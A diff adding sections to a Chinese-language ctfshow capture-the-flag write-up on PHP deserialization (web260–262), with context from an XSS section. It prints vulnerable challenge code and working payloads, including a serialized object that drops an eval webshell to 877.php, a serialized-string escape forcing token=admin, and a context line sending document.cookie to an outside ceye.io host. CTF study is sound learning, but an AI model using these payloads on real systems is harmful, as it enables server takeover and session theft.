@@ -2292,6 +2292,219 @@ O%3A10%3A%22SoapClient%22%3A36%3A%7Bs%3A15%3A%22%00SoapClient%00uri%22%3Bs%3A3%3
 
 
 
+### web260
+
+```
+<?php
+
+error_reporting(0);
+highlight_file(__FILE__);
+include('flag.php');
+
+if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
+    echo $flag;
+}
+
+```
+
+是这样的，首先包含了flag.php，如果ctfshow的GET请求序列化后有“ctfshow_i_love_36D”字样就给你flag。
+
+可序列化又不更改对象名称，所以直接输入即可，这题纯吓唬人。
+
+payload:?ctfshow=ctfshow_i_love_36D
+
+
+
+### web261
+
+```
+<?php
+
+highlight_file(__FILE__);
+
+class ctfshowvip{
+    public $username;
+    public $password;
+    public $code;
+
+    public function __construct($u,$p){
+        $this->username=$u;
+        $this->password=$p;
+    }
+    public function __wakeup(){
+        if($this->username!='' || $this->password!=''){
+            die('error');
+        }
+    }
+    public function __invoke(){
+        eval($this->code);
+    }
+
+    public function __sleep(){
+        $this->username='';
+        $this->password='';
+    }
+    public function __unserialize($data){
+        $this->username=$data['username'];
+        $this->password=$data['password'];
+        $this->code = $this->username.$this->password;
+    }
+    public function __destruct(){
+        if($this->code==0x36d){
+            file_put_contents($this->username, $this->password);
+        }
+    }
+}
+
+unserialize($_GET['vip']);
+```
+
+魔术方法的反序列化，一眼顶真。
+
+看得出来我们应该执行__invoke()
+
+在php7.4.0开始，如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。 我们不需要考虑__wakeup,__invoke是类被进行函数调用时启用，也无法利用到，所以直接看看能不能写入文件。
+
+0x36d十进制就等于877,因为是弱类型比较，像877a等都可以通过，所以我们用username='877.php',password='一句话木马'，不用在意那个wakeup
+
+```
+<?php
+    class ctfshowvip
+    {
+        public $username;
+        public $password;
+
+        public function __construct($u, $p)
+        {
+            $this->username = $u;
+            $this->password = $p;
+        }
+    }
+
+    $a = new ctfshowvip('877.php', '<?=eval($_POST[1]);?>');
+    echo urlencode(serialize($a));
+?>
+```
+
+如此一来，当a被输入后，$code就会将username和password拼接起来再传给__destruct()中然后让它输出。这样我们就把木马成功写入877.php文件，之后用AntSword连接即可。
+
+得到的序列化值为：
+
+O%3A10%3A%22ctfshowvip%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A21%3A%22%3C%3F%3Deval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D
+
+用vip作为GET输入后，挂上木马，不过没有回显，无所谓了。访问877.php即可得到webshell，然后拿到flag。
+
+flag在/flag_is_here中，害得我一顿好找。
+
+![](.\反序列化\图片\261.png)
+
+### web262
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-03 02:37:19
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-03 16:05:38
+# @message.php
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+error_reporting(0);
+class message{
+    public $from;
+    public $msg;
+    public $to;
+    public $token='user';
+    public function __construct($f,$m,$t){
+        $this->from = $f;
+        $this->msg = $m;
+        $this->to = $t;
+    }
+}
+
+$f = $_GET['f'];
+$m = $_GET['m'];
+$t = $_GET['t'];
+
+if(isset($f) && isset($m) && isset($t)){
+    $msg = new message($f,$m,$t);
+    $umsg = str_replace('fuck', 'loveU', serialize($msg));
+    setcookie('msg',base64_encode($umsg));
+    echo 'Your message has been sent';
+}
+
+highlight_file(__FILE__);
+
+
+```
+
+**注释里告诉我们message.php,要求我们的token为admin**
+
+**该题运用反序列化字符串逃逸，运用的思想跟sql注入的闭合相似**
+
+**我们这里有一个序列化字符串，我们要改变token属性，但我们无法直接控制它的值。**
+
+**我们只能给from，msg，to传递值，即这三个属性是可控的**
+
+```
+O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:1:"3";s:5:"token";s:4:"user";}
+```
+
+**假如我们向to属性传递 t=3";s:5:"token";s:5:"admin";} 字符串就变为了下面这样**
+
+```
+O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:27:"3";s:5:"token";s:4:"user";}";s:5:"token";s:5:"admin";}
+```
+
+**我们对字符串进来了闭合，这样我们就可以控制token属性的值了，但我们也会发现一点，to属性值的长度变为了27。**
+
+**反序列化时，如果为27则会匹配后面27个字符，这样闭合就没有效果。**
+
+**这时候题目中的替换字符函数可以帮助到我们**
+
+```
+$umsg = str_replace('fuck', 'loveU', serialize($msg));
+```
+
+**str_replace会将fuck替换为loveU，且替换是在序列化之后进行的，也就是说，实际字符串长度增加了1，但标明的字符串长度任然为原值**
+
+```
+// 替换前
+s:2:"to";s:4:"fuck";
+// 替换后
+s:2:"to";s:4:"loveU";
+```
+
+**通过这种方法，我们就可以凭空增加字符，来成功进行闭合**
+
+```
+// t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
+// 后面多出27个字符，所以我们写27个fuck，替换为loveU后，增加了27个字符，来达到字符串逃逸
+```
+
+**最终我们的payload为**
+
+```
+f=1&m=2&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
+```
+
+这题十分的像pwn51，用魔法打败魔法。
+
+然后访问message.php即可得到flag
+
+
+
+### web263
+
+
+
 ## XSS
 
 > document.cookie							用于js获取当前网页的cookie值
@@ -2395,3 +2608,6 @@ img.src="http://hi8y3b.ceye.io/"+document.cookie;
 但这个payload依旧坚挺。
 
 ![](.\XSS\图片\web319.png)
+
+
+
